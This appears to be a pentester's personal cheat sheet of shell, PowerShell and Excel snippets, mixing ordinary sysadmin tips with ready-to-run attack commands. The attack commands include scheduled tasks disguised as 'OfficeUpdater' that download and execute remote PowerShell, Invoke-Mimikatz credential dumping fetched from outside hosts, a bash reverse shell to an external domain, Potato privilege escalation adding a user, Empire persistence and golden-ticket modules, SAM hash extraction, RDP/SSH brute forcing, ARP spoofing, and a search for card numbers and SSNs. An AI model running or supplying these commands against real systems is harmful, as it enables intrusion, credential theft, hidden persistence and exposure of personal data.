            #Want to turn off Retweets from all users you're following without clicking each time? This script sorts that, using a timer to avoid your requests being blocked and returning a 403. Scroll to the bottom of your Following list, paste it into Chrome's console
            
            a=Array.prototype.slice.call(document.querySelectorAll("div.ProfileCard-content div.dropdown"));
            a.forEach(function(e) {e.querySelector("button").click(); e.querySelector("li.retweet-off-text button").click(); })
            
            var interval=setInterval(function(){
              $('.user-actions.including .retweet-off-text').last().click();
              if ($('.user-actions.including .retweet-off-text').length<1) {
                clearInterval(interval);
              }
            },20000);
            
            
            # ugh unicornscan.. udp fast
            unicornscan -mU -Ir 1000 20.0.0.1:a -v
            
            #john 1337 some place on VM's john.conf file .. ?
            
            l /a /e /l /o /s sa4 se3 sl[1|] so0 ss5
            l /a /e /l /o /s sa@ se3 sl1 so0 ss[$5]
            
            
            

MongoDB notes
-------------------

            mongodump --host 127.0.0.1
            mongo HOSTNAME   --eval "printjson(db.getCollectionNames())"
            
            show dbs
            use DB
            db.getName()
            db.getCollectionNames()
            
            
            
            service mongod start
            

more masscan
-------------------

            masscan -p80,8000-8100 10.0.0.0/8
            masscan -p0-65535 --rate 150000 -oL output.txt
            
            masscan -p0-65535 23.239.151.0/24 --rate 150000 -oL output.txt
            

playback conf
-------------------

            /masscan -p0-65535 23.239.151.0/24 --rate 150000 -oL output.txt --echo > scan.conf
            /masscan -c scan.conf
            
            masscan --ports 80,443,22,445,135,139,5900,5800,5901,5801,8080 --rate 150000 -oL 172_masscan_common.txt  172.16.0.0/12
            
            # idea for new and improved smart nmap ? just worry about the last oct guessing .. so .1 .2 .254 .10 .100 etc..
            nmap --max-retries 1 --min-parallelism 100 172.16-31.0-255.1,2,3,4,5,10,20,30,100,254 -sV 172_sV_GUESS --top-ports 20 -T5
            nmap --max-retries 1 --min-parallelism 100 10.0-255.0-255.1,2,3,10,20,30,100,254 -sV 10_sV_GUESS --top-ports 20 -T5
            
             
            # potato PO TAT O ! !!!!!!!!!!!!!!!!!!!!!
            Potato.exe -ip 25.0.0.151 -cmd "c:\\windows\\system32\\cmd.exe /k net user add SUCKITGARY 123QWE#" 
            
            
            # you know ...
            
            #(X86) - On User Login
            schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
             
            #(X86) - On System Start
            schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
             
            #(X86) - On User Idle (30mins)
            schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
             
            #(X64) - On User Login
            schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
             
            #(X64) - On System Start
            schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
             
            #(X64) - On User Idle (30mins)
            schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
            
            # armitage script for fvwm-crystal / PTF 
            cat /usr/local/sbin/armitage 
            
            cd /opt/armitage
            
            cat <<EOF> /tmp/armitage_rc
            
            export PATH="$PATH:/pentest/exploitation/metasploit"
            export MSF_DATABASE_CONFIG="/opt/database.yml"
            FvwmCommand Style "*" Lenience
            cd /opt/armitage/
            ./armitage
            
            EOF
            
            chmod -R 755  /tmp/armitage_rc
            screen -fa -d -m /tmp/armitage_rc
            
            
            
            #horrid way to json to csv to find sploits or something .. I gave up
            for i in `ls` ;do echo $i;cat $i; done | sed 's/^CVE/BREAKCVE/g' |sed 's/^}CVE/BREAKCVE/g'|egrep -v '(\"summary\")'  |sed 's/,/ /g'| egrep -ia '(BREAKCVE|url|exploit|summery|title)' | tr -d '\n' |  awk '{gsub("BREAKCVE","\nCVE"); print}'| sed 's/{/,/g' | sed 's/  //g' >out.csv
            
            
            vfeed example
            git pull -f
            ./vfeedcli.py -m get_cve CVE-2015-0240
            
            ./vfeedcli.py -m json_dump CVE-2015-1761 | egrep -ia '(url|exploit|summary|title)'
            
            
            here is a link to some of my main wordlist:
            
            https://www.amazon.com/clouddrive/share/uBt6kSsUNLUmVl7aqLB5kDC7iJ8zx4eaxVgkar8Mhqw?ref_=cd_ph_share_link_copy
            
            _18_in_1: is about 40gigs uncompressed
            found_2015.txt and 2016: are more recent dumps http://hashes.org/crackers.php 
            
            
            reversing and firmware (IOT)
            
            https://security.googleblog.com/2016/03/bindiff-now-available-for-free.html
            
            firmware stuff
            http://wiki.securityweekly.com/wiki/index.php/Reverse_Engineering_Firmware_Primer
            https://github.com/mirror/firmware-mod-kit
            
            
            
            # ettercap duh ..
            
            ettercap -w try1.pcap -T -M ARP /TARGET// /// -P autoadd 
            
            

tcpdump with some flags 
-------------------

            12:35 < SyncYourDogmas> tcpdump -qns 0 -A -r -
            

dump URL with ip src and dst 
-------------------

            tshark -nr dump.pcap    -E separator=, -R "http.request.uri " -T fields  -e frame.number -e frame.time -e ip.src -e ip.dst -e text
            
            # dont use ....stupid hex outputwith \r in it  dump some decoded info and the packet data in hex ascii 
            tshark -PVx -r dump.pcap -T text
            

Ubuntu auto updates
-------------------

            apt-get update
            apt-get install unattended-upgrades -y
            dpkg-reconfigure --priority=low unattended-upgrades

set Reboot to true
-------------------

            vi /etc/apt/apt.conf.d/50unattended-upgrades
            unattended-upgrades
            
            

ubuntu aunattended rel upgrades
-------------------

            do-release-upgrade -f DistUpgradeViewNonInteractive
            
            
            # CentOS ... LVM/XFS resize
            lvextend -l 100%VG /dev/mapper/centos-root
            This one extends the filesystem while booted
            xfs_growfs /
            

rdp and ssh brute
-------------------

            ncrack -p rdp -u administrator --pass 'password' -iL in2
            ncrack -p ssh -u root --pass 'root' -iL in
            
            #iftop config 
            cat << EOF > ~/iftop.conf
            max-bandwidth: 10M
            port-display: on # Controls display of port numbers.

Controls conversion of port numbers to service names
-------------------


filter out yourself
-------------------

            EOF
            
            iftop  -c ~/iftop.conf
            
            
            
            #plex traffic shape
            
            modprobe sch_htb
            /sbin/tc qdisc del dev eth0 root
            /sbin/iptables -D OUTPUT -t mangle -p tcp --sport 32400 '!' --dst 25.0.0.0/8 -j MARK --set-mark 10
            /sbin/tc qdisc add dev eth0 root handle 1: htb default 20 r2q 50
            /sbin/tc class add dev eth0 parent 1: classid 1:1 htb rate 4mbit ceil 4mbit
            /sbin/tc class add dev eth0 parent 1:1 classid 1:10 htb rate 2mbit ceil 4mbit
            /sbin/tc qdisc add dev eth0 parent 1:10 handle 100: sfq perturb 10
            /sbin/iptables -A OUTPUT -t mangle -p tcp --sport 32400 '!' --dst 25.0.0.0/8 -j MARK --set-mark 10
            /sbin/tc filter add dev eth0 parent 1: prio 3 protocol all handle 10 fw flowid 1:10
            

show TC rules
-------------------

            /sbin/tc -s -d class show dev eth0

Show iptables mangle rules
-------------------

            /sbin/iptables -t mangle -n -v -L

Show actual bandwidth being used on 32400
-------------------

            watch -n 1 /sbin/tc -s -d class show dev eth0
            
            
            ##KODI XBMC OSD
            export var1=`df -h | egrep "(\/$|sdb1|sdc1)" | awk '{print $4"|",$6"|"}'|tr -d '\n'`
            wget --header="Content-Type: application/json" --post-data="{\"jsonrpc\":\"2.0\",\"method\":\"GUI.ShowNotification\",\"params\":{\"title\":\"Disk Space\",\"message\":\"$var1\", \"image\":\"<image path or URL to image here>\"},\"id\":1}" http://localhost:9999/jsonrpc
            
            #Wireless Backdoor Creation: Credit http://pwnwiki.io/
            netsh wlan set hostednetwork mode=[allow\|disallow]
            netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary
            netsh wlan [start|stop] hostednetwork
             

empirepowershell
-------------------

            
            set Host rmccurdy.myvnc.com
            set Name rmccurdy.myvnc.com
            set Port 443
            execute
            list
            
            
            usemodule privesc/powerup/allchecks
            
            
            
            # disable annoying GWX  "Get Windows 10" icon that keeps comming back
            reg add  "HKLM\SOFTWARE\Policies\Microsoft\Windows\Gwx" /v DisableGwx  /t REG_DWORD /d "00000001" /f
            
            

linkedin username harvest
-------------------

            for i in `seq 1 100`
            # max 100 pages or 1000 hits ...filter out in 100 page chunks
            do
            curl {paste the curl command from burp suite from the 1st page button here and take out the '' from the url and replace with "" so you can put page_num=$i } | awk '{gsub("firstName=","\n"); print}' | grep isAjax= | sed 's/\&isAjax=.*//g' | sed 's/&lastName=/,/g'
            echo finished  $i sleeping 
            sleep 5
            done
            
            
            # linkedin username cleanup regex http://regexr.com/
            \+[A-Z]{1,5}%2E|%2E|%2C|\+[A-Z]{2,5}|\+Jr|\-[A-Z]{2,5}|\+%2F|Van\+|van\+|de\+|den\+|%27|\+[A-Z],|De\+|le\+|\-P
            
            
            

popup otify in kodi using webserver enabled API
-------------------

            export var1=`df -h | egrep "(\/$|sdb1|sdc1)" | awk '{print $4"|",$6"|"}'|tr -d '\n'`
            wget --header="Content-Type: application/json" --post-data="{\"jsonrpc\":\"2.0\",\"method\":\"GUI.ShowNotification\",\"params\":{\"title\":\"Title Goes Here\",\"message\":\"$var1\", \"image\":\"<image path or URL to image here>\"},\"id\":1}" http://localhost:9999/jsonrpc
            
            #fix nm-applet issues
            
            apt-get purge -y hostapd && sudo apt-get purge -y network-manager && sudo apt-get install network-manager
            
            # nmap PTH
            nmap -p U:137,T:139 -script-args -smbuser=mike,smbhash=8846f7eaee8fb117ad06bdd830b7586c. -script=smb-enum-groups -script=smb-enum-users 192.168.52.151
            

some nse scripts to run on host
-------------------

            nmap -oA nse --script discovery,safe,vuln,version 172.16.22.11
            
            # danger NMAP!
            
            updatedb
            locate http-slowloris.nse | xargs rm -Rf
            
            nmap -sV -oA nse --script-args=unsafe=1 --script-args=unsafe  --script "auth,brute,discovery,exploit,external,fuzzer,intrusive,malware,safe,version,vuln and not(http-slowloris or http-brute or http-enum or http-form-fuzzer)"
            
            

 Powershell Empire lulz
-------------------

            ps
            psinject PID#
            
            usemodule privesc/powerup/allchecks
             
            usemodule privesc/gpp
            
            usemodule credentials/mimikatz/logonpasswords
            
            
            bypassuac
            usemodule privesc/bypassuac_wscript
            usemodule credentials/mimikatz/golden_ticket
            usemodule credentials/mimikatz/silver_ticket
            
            usemodule situational_awareness/network/powerview/share_finder
            set CheckShareAccess
            
            usemodule persistence/userland/registry
            usemodule persistence/userland/schtasks
            

CLI searm multi threded downloads
-------------------

            apt-get install aria2
            aria2c --file-allocation=none -c -x 4 -s 4 -d "./" -i FILEWITHURLS 
            
            
            # mount samba ...
            mkdir /media/SSD
            mount -t cifs "//IP\Open Share" /media/SSD -o username=guest,noexec
            
            

monitor HP RAID
-------------------

            apt-get install hp-health
            apt-get install hpacucli
            apt-get install hponcfg
            
            
            hpacucli ctrl all show status
            hplog -t
            hpacucli ctrl all show config       
            
            hpacucli controller all show config detail | grep -A 7 -B 3 Fail | egrep '(Failed|Last|Serial Number|Port)'
            
            

dump file list of zip contents 
-------------------

            FOR /F "tokens=* delims=" %%A in ('dir /b /s *.zip') do (C:\usb\media\7zip\7z.exe l -r "%%A" >> listing.txt)
            
            #VeraCrypt mount command line
            "C:\Program Files\VeraCrypt\VeraCrypt.exe"  /letter H /v "D:\VMWARE_DONOTDELETE\VC" /auto
            

set null password for sudo root and allow null login
-------------------

            
            usermod -p "" administrator
            cp /etc/pam.d/common-auth /etc/pam.d/common-auth.BK
            sed 's/nullok_secure/nullok/g' /etc/pam.d/common-auth.BK > /etc/pam.d/common-auth
            
            

disable ubuntu update 
-------------------

            sudo killall update-notifier
            sudo mv /usr/bin/update-notifier /usr/bin/update-notifier.real
            echo -e '#!/bin/bash\nwhile :; do /bin/sleep 86400; done' | sudo tee /usr/bin/update-notifier
            sudo chmod 755 /usr/bin/update-notifier
            
            #greenbone opvnvas
            https://launchpad.net/~mrazavi
            
            stall OpenVAS 8 in Ubuntu 14.04 using PPA
            You can install OpenVAS 8 in Ubuntu 14.04 using this ppa:
            
            https://launchpad.net/~mrazavi/+archive/ubuntu/openvas
            
            $ sudo add-apt-repository ppa:mrazavi/openvas
            $ sudo apt-get update
            $ sudo apt-get install openvas
            
            You have to update openvas scripts/data after installation with the following commands:
            
            sudo apt-get install sqlite3
            sudo openvas-nvt-sync
            sudo openvas-scapdata-sync
            sudo openvas-certdata-sync
            
            sudo service openvas-scanner restart
            sudo service openvas-manager restart
            sudo openvasmd --rebuild --progress
            
            Login into https://localhost:443 with "admin" as username and password.
            
            
            # Burp Suite (copy as curl command)
            # remove the -i -s and add -o output.ext
            curl -i -s -k  -X 'GET' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0' -b 'AUTH_rttf3AAAAAAAonce=c54AAAadr6a' 'https://doc-0'
            	
            	
            
            # /etc/shadow password 'password' root
            $6$FV9lt0.l$Yi4d1ayIv48jrcQVAMuIDwchY5Ra7Dmd/ps9IcgiDJBZkQdukPAcoauGNcY5umvb56Kw3e7GZ/HyJJNDCKEZ1/
            
            REGEXP FOR CLASS A NETWORKS :
            (10)(\.([2][0-5][0-5]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){3}
            
            REGEXP FOR CLASS B NETWORKS :
            (172)\.(1[6-9]|2[0-9]|3[0-1])(\.([2][0-5][0-5]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){2}
            
            REGEXP FOR CLASS C NETWORKS :
            (192)\.(168)(\.([2][0-5][0-5]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){2}
            
            # CDP SSDP 
            nmap --script broadcast-listener --script-args=broadcast-listener.timeout=60 -oA broadcast_listener
            
            # better ?
            nmap --script discovery --script-args=broadcast-listener.timeout=60 -oA broadcast_listener_discovery
            
            #Temporary Switch gateway script:
            
            Close all browsers ( DNS cache in browsers ... I know right )
            Flush DNS cache so we don.t have any DNS issues ... ( or better yet disable DNS caching ... )
            ipconfig /flushdns
            
            Backup current GW settings ..
            for /f "tokens=2,3 delims={,}" %%a in ('"WMIC NICConfig where IPEnabled="True" get DefaultIPGateway /value | find "I" "') do set GW1=%%~a
             
            REM  set GW to always tunnel GW ...
            route delete 0.0.0.0
            route add 0.0.0.0 mask 0.0.0.0 YOUR_GATEWAY_IP_HERE
            
            
            Check your IP changed 
            start http://rmccurdy.com/ip.php
            
            echo Press any key to reset GW back to Default
            pause
            
            ipconfig /flushdns
            
            route delete 0.0.0.0
            route add 0.0.0.0 mask 0.0.0.0 %GW1%
            
            #Rename your Wireless adapter to WIFI to set DHCP:
            netsh interface ipv4 set address name="WIFI" dhcp
            netsh interface ipv4 set dnsservers name="WIFI" source=dhcp
            
            #Set Wireless adapter name to WIFI for static settings for IP, Route and DNS1 and DNS2:
            netsh interface ipv4 set address name="WIFI" dhcp
            netsh interface ipv4 set dnsservers name="WIFI" source=dhcp
            netsh interface ipv4 set address name="LAN" source=static address=10.0.0.XXX mask=255.255.255.0 gateway=10.0.0.1
            netsh interface ipv4 add dnsserver name="LAN" address=4.2.2.2 index=1
            netsh interface ipv4 add dnsserver name="LAN" address=198.6.1.2 index=2
            

dump configs from firewall list using putty and input scripts
-------------------

            for i in `cat CHECK_22`
            do
            ./putty.exe -ssh username@$i -pw passwordgoeshere -m PUTTY_SCRIPT
            done
            
            PUTTY_SCRIPT:
            enable
            passwordgoeshere
            passwordgoeshere
            more system:running-config
            
            <---  bunch of blank spaces here to get around MORE -----> 
            
            quit
            exit 
            

zmap scans 
-------------------

            sed -i 's/^black/#black/' /etc/zmap/zmap.conf
            zmap -M icmp_echoscan -B 1G -P 1 -T 100 -w net_only_big.txt -o net_only_big.csv
            zmap -p  80 -B 90MB -P 1 -T 50 -w in -o scope.csv
             

sort ips logicly and show counts of class C to find host ranges that return all as UP
-------------------

            sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4  | sed  's/\.[0-9]\{1,3\}$//g' |  uniq -c | sort -n
            

faster nmap
-------------------

            nmap -n -sn -PE -T5 --max-retries 1 --min-parallelism 100 -iL scope.txt -oA scope
             
            
            
            #p0f
            p0f -i eth0 -p -o ./p0f.log
            
            #reboot mac apple
            shutdown -r now
            osascript -e 'tell app "System Events" to restart'
            # shutdown ..
            osascript -e 'tell app "System Events" to shut down'
            

sanitize passwords
-------------------

            awk 'BEGIN {FS=":"}; {printf "%s:%s%s%s\n", $1, substr($2,0,1), "***", substr($2,length($2),1)}'
            
            echo '8846f7eaee8fb117ad06bdd830b7586c:password'|sed 's/^\(.*:.\).*\(.\)$/\1****\2/'
            
            

local sam dump via shell hash
-------------------

            reg SAVE HKLM\SAM sam
            reg save HKLM\SYSTEM sys
            
            bkhive sys key
            samdump2 sam key > hash
            

smb mount ubuntu
-------------------

            //servername/sharename  /media/windowsshare  cifs  username=msusername,password=mspassword,iocharset=utf8,sec=ntlm  0  0
            
            
             
            
            #autohotkey anti idle moves mouse every 58ish seconds 
            
            #InstallMouseHook
            F7::
            loop, 999 {
            tooltip, WAKEUPFOOL
            MouseMove, -1, 0 , 10, R ;around it's starting position
            sleep,1000
            tooltip,
            sleep, 57000
            }
            
            
            return
             
            # unicornscan ..
            
            unicornscan -L 10  -R 2 -r 1000 -p 21,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 `cat in` 
            
            #mimikatz bypass AV dump creds
            powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
            powershell "IEX (New-Object Net.WebClient).DownloadString('http://185.12.45.93/scripts/downloaded/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
            powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds -ComputerName @('computer1', 'computer2')"
            

chown chmod for windows run as system or administrator
-------------------

            takeown /F "%CD%" /R
            
            icacls "%CD%" /GRANT Users:F /T
            cacls "%CD%" /E /T /C /G Users:F
            
            
            #sexy looking diff thanks to https://github.com/briangerard/my_env 
            function mydiff () {
            cols=`stty size | awk '{print $2}'`
            diff --side-by-side --left-column --width=$cols --ignore-all-space $1 $2
            }
            
            #fix windows errors maybe ..
            run sfc /SCANNOW /OFFBOOTDIR=d:\ /OFFWINDIR=d:\windows
            

MSSQL HELL
-------------------

            Open SQL Server Management studio, right click on the database and choose 'Tasks->Generate Scripts...'
            
            Then use the wizard to backup the database. You can script the whole database or parts of it. Two important options: In the 'Advanced' section, you will probably want to ensure 'Type of backup = 'Schema and Data' and the 'Script Statistics' is on.
            
            
            # create CSV of redable files in a path and info on the files using the file() command
            find .   -exec file '{}'  \;  > /tmp/file.txt
            sed 's/,/_/g' /tmp/file.txt | sed 's/:/,/g' > file.csv
            
            
            #vmware convert ovf ovftool
            ovftool RW2\ Dev.ovf what.vmx  --skipManifestCheck --skipManifestGeneration
            
            #virtual box vbox mount share
            mkdir /s
            mount -t vboxsf delete /s/
            
            # run cmd.exe as administrator !
            net user /del samid
            dsadd user "CN=FIRST LAST,OU=OUGROPNAMEHERE,DC=FISTPARTOFDOMAIN,DC=MIDDLEPART,DC=LASTPART_COMMA_FOR_EACH_DOT_IN_THE_FQDN" -samid SAMID -fn "FIRST"  -ln "LAZST" -email FLast@DOMAIN.com  -desc "LAST, FIRST"  -pwd PASSWORD
            net group  /add "OUGROPNAMEHERE" samid /domain
            
            

word press scan notes
-------------------

            wpscan.rb --follow-redirection --url TARGET --enumerate vp
            wpscan.rb --follow-redirection --url TARGET --enumerate vt
            wpscan.rb --follow-redirection --url TARGET --wordlist 500.txt --username admin
            wpscan.rb --follow-redirection --url TARGET --enumerate u
            
            
            
            
            # Change file timestamp in Windows Sometimes you need to modify a fileâ€™s timestamp and donâ€™t want to change the content of the file. Copy command has an easy way to do it:
            copy /b filename.ext +,,
            
            

excell hell
-------------------

            

Split long col into 7 equal col
-------------------

            Sub SplitIntoCellsPerColumn()
            Range("B2:H1894").ClearContents
              Dim X As Long, LastRow As Long, vArrIn As Variant, vArrOut As Variant
              LastRow = Cells(Rows.Count, "A").End(xlUp).Row
              numofrows = LastRow / 7
              numofrows_rundup = Round_Up(numofrows)
              vArrIn = Range("A1:A" & LastRow)
              ReDim vArrOut(1 To numofrows_rundup, 1 To Int(LastRow / numofrows_rundup) + 1)
              For X = 0 To LastRow - 1
                vArrOut(1 + (X Mod numofrows_rundup), 1 + Int(X / numofrows_rundup)) = vArrIn(X + 1, 1)
              Next
              Range("B2").Resize(numofrows_rundup, UBound(vArrOut, 2)) = vArrOut
              
              Range("A:A").ClearContents
              
            End Sub
            
            
            Function Round_Up(ByVal d As Double) As Integer
                Dim result As Integer
                result = Math.Round(d)
                If result >= d Then
                    Round_Up = result
                Else
                    Round_Up = result + 1
                End If
            End Function
            
            

The length of the IP string and the first octet delineator
-------------------

            =LEN(D6)
            =FIND(".",D6)
            
            #Octet 1
            =LEFT(D6,FIND(".",D6)-1)
            
            #Octets 2-4
            =RIGHT(D6,(LEN(D6)-FIND(".",D6)))
            
            #Octet 2
            =LEFT(RIGHT(D6,(LEN(D6)-FIND(".",D6))),FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))-1)
            
            # Location of the second "."
            =FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))
            
            #Length of last three octets
            =LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))
            
            #Lenght of the last two octets
            =LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))
            
            #Octets 3-4
            =RIGHT(RIGHT(D6,(LEN(D6)-FIND(".",D6))),LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6)))))
            
            #Location of the third "."
            =FIND(".",RIGHT(RIGHT(D6,(LEN(D6)-FIND(".",D6))),LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))))
            
            #Octet 3
            =LEFT(RIGHT(RIGHT(D6,(LEN(D6)-FIND(".",D6))),LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))),FIND(".",RIGHT(RIGHT(D6,(LEN(D6)-FIND(".",D6))),LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))))-1)
            
            #Octet 4
            =RIGHT(RIGHT(RIGHT(D6,(LEN(D6)-FIND(".",D6))),LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))),(LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(RIGHT(D6,(LEN(D6)-FIND(".",D6))),LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))))))
            
            #Last Octet with incremented (by 1) host IP
            =TEXT((VALUE(RIGHT(RIGHT(RIGHT(D6,(LEN(D6)-FIND(".",D6))),LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))),(LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(RIGHT(D6,(LEN(D6)-FIND(".",D6))),LEN(RIGHT(D6,(LEN(D6)-FIND(".",D6))))-FIND(".",RIGHT(D6,(LEN(D6)-FIND(".",D6)))))))))+1),"0")
            
            #Reassembly of the new IP address, the number +2, near the end of the string is the amount the host address will be incremented by
            =CONCATENATE(LEFT($D6,FIND(".",$D6)-1),".",LEFT(RIGHT($D6,(LEN($D6)-FIND(".",$D6))),FIND(".",RIGHT($D6,(LEN($D6)-FIND(".",$D6))))-1),".",LEFT(RIGHT(RIGHT($D6,(LEN($D6)-FIND(".",$D6))),LEN(RIGHT($D6,(LEN($D6)-FIND(".",$D6))))-FIND(".",RIGHT($D6,(LEN($D6)-FIND(".",$D6))))),FIND(".",RIGHT(RIGHT($D6,(LEN($D6)-FIND(".",$D6))),LEN(RIGHT($D6,(LEN($D6)-FIND(".",$D6))))-FIND(".",RIGHT($D6,(LEN($D6)-FIND(".",$D6))))))-1),".",TEXT((VALUE(RIGHT(RIGHT(RIGHT($D6,(LEN($D6)-FIND(".",$D6))),LEN(RIGHT($D6,(LEN($D6)-FIND(".",$D6))))-FIND(".",RIGHT($D6,(LEN($D6)-FIND(".",$D6))))),(LEN(RIGHT($D6,(LEN($D6)-FIND(".",$D6))))-FIND(".",RIGHT($D6,(LEN($D6)-FIND(".",$D6))))-FIND(".",RIGHT(RIGHT($D6,(LEN($D6)-FIND(".",$D6))),LEN(RIGHT($D6,(LEN($D6)-FIND(".",$D6))))-FIND(".",RIGHT($D6,(LEN($D6)-FIND(".",$D6)))))))))+2),"0"))
            
            
            # IP | HOSTNAME to IP (HOSTNAME) in one cell in excel 
            =CONCATENATE(A9,(IF(ISBLANK(B9),""," ("&B9&")")))
            

Mount all NFS shares on a remote host with input file nfs as hosts to mount
-------------------

            for i in `cat nfs` 
            do
            mkdir /nfs
            
            
            for j in `showmount -e $i |awk '{print $1}'` 
            do 
            var1=$RANDOM
            mkdir /nfs/$i_$var1
            mount -t nfs $i:$j /nfs/$i_$var1
            done
            
            
            done
            

example PII search CC and SSN with dashes and max results 10 per file
-------------------

            find .  -maxdepth 6  -size -100000k -type f  -exec egrep --max-count 10 -A 2 -B 2 -Hia "\b4[0-9]{12}(?:[0-9]{3})?\b|\b5[1-5][0-9]{14}\b|\b6011[0-9]{14}\b|\b3(?:0[0-5]\b|\b[68][0-9])[0-9]{11}\b|\b3[47][0-9]{13}\b|\b[0-9]{3}-[0-9]{2}-[0-9]{4}\b" '{}' \;
            
            #  head all files for passwords gonig 6 deep ( peeking into all files not just small ones .. )
            find .   -maxdepth 6 -type f -exec head -c 100000 '{}' \; |egrep -Hia  -A 4 -B 4 passw
            
            # find passwords 6 deep and less then 1m adding padding so you can see username/hostname info before or after the password field ..
            find . -maxdepth 6  -size -100000k -type f  -exec egrep -A 4 -B 4 -Hia passw '{}' \;
            
             
            # can't read ? what is wrong with you ??? find readable files...
            find .  -readable -type f
            

do a quick tree dump 3 levels deep of folders
-------------------

            find . -maxdepth 3 \( -path /opt -o -path /proc -o -path /tmp \) -prune -o -type d
            
            

auto login tty1
-------------------

            vi /etc/init/tty1.conf
            exec /bin/login -f administrator < /dev/tty1 > /dev/tty1 2>&1
            
            # startx to fvwm-crystal 
            apt-get install xinit -y
            echo 'exec fvwm-crystal' > ~/.xinitrc
            

install stuff 
-------------------

            apt-get install build-essential  libssl-dev    partimage gparted lynx links curl nmap iotop screen medusa  wireshark macchanger -y 
            
            
            #force umount
            umount -l /mnt/myfolder 
            umount -f -l /mnt/myfolder 
            
            
            #Clipboard Copy and Paste does not work in vSphere Client
            #Options > Advanced > General and click Configuration Parameters. Click Add Row.
            
            isolation.tools.copy.disable 	FALSE
            isolation.tools.paste.disable 	FALSE
            
            
            
            #VLC convert transcoding 
            vlc $1 -I dummy  "./$a" --sout "#transcode{width=320,height=240 ,vcodec=mp1v,acodec=mpga,vb=128,ab=128,deinterlace}:standard{mux=ts,dst=\"./Trans_$1\",access=file}" vlc://quit
            
            
            # ref http://en.wikipedia.org/wiki/Setuid

find Setuid world writable files
-------------------

            find / \( \( -perm -4000 -o -perm -2000 -type f \) -and \( -perm -0002 -o -perm -0020 \) \) -type f -ls
            
            
            find . -perm 777 -exec chmod 755 {} \;
            find / -perm 777 -type d
            
            #sort char by lenth
            #! /bin/sh
            awk 'BEGIN { FS=RS }
            { print length, $0 }' $* |

Sort the lines numerically
-------------------

            sort +0n -1 |

Remove the length and the space and print each line
-------------------

            sed 's/^[0-9][0-9]* //'
            
            

imagemagik convert create TN
-------------------

            IFS=$'\n' ;for img in `ls *.jpg` ; do convert -sample 256 -quality 90 '$img" "$img" ;done
            

du disk usage sort
-------------------

            du -k * | sort -nr | cut -f2 | xargs -d '\n' du -sh
            
            
            #rev shell
            nc -l -p 8080 -vvv
            bash -i >& /dev/tcp/rmccurdy.com/8080 0>&1
            
            
            #nagios
            -c CheckEventLog -a file=application MaxWarn=1 MaxCrit=1 filter=new filter+generated=\<1d filter+eventID==208 truncate=120 filter+eventType==warning
            

IPFW limit max connects to 2
-------------------

            allow tcp from any 80 to any out via dc0 limit dst-addr 2
            

rm remove empty files
-------------------

            find . -depth -empty -type d -exec  rmdir {} \;
            
            
            
            
